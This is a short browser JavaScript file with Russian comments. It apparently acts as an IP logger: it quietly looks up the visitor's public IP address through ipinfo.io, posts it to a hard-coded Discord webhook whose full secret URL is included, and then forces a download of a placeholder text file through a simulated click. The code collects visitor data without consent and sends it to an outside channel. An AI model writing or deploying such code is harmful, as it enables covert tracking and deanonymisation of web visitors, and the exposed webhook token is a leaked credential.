// Ваш вебхук Discord
const webhookURL = 'https://discord.com/api/webhooks/1104855216899248332/7m3WHRCwidYcFWIHwYwcSKOVQUsdkQsk8vduVL1AUfSnfO1AjNN8SZ84vNzhB_ACT4cq';

// Функция для отправки сообщения на Discord
function sendToDiscord(message) {
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: message }),
    })
    .then(response => console.log('Сообщение успешно отправлено'))
    .catch(error => console.error('Ошибка отправки сообщения', error));
}

// Получение IP-адреса с использованием ipinfo.io
fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        const ipAddress = data.ip || 'Не удалось определить IP-адрес';
        const message = `IP-адрес пользователя: ${ipAddress}`;
        sendToDiscord(message);
    })
    .catch(error => console.error('Ошибка получения IP-адреса', error));

// Создаем объект Blob с содержимым файла (в данном случае, текстовый файл)
const fileContent = 'Привет, мир!';
const blob = new Blob([fileContent], { type: 'text/plain' });

// Создаем ссылку для скачивания файла
const link = document.createElement('a');
link.href = URL.createObjectURL(blob);
    
// Устанавливаем имя файла
link.download = 'example.txt';

// Симулируем клик по ссылке для запуска скачивания
link.click();
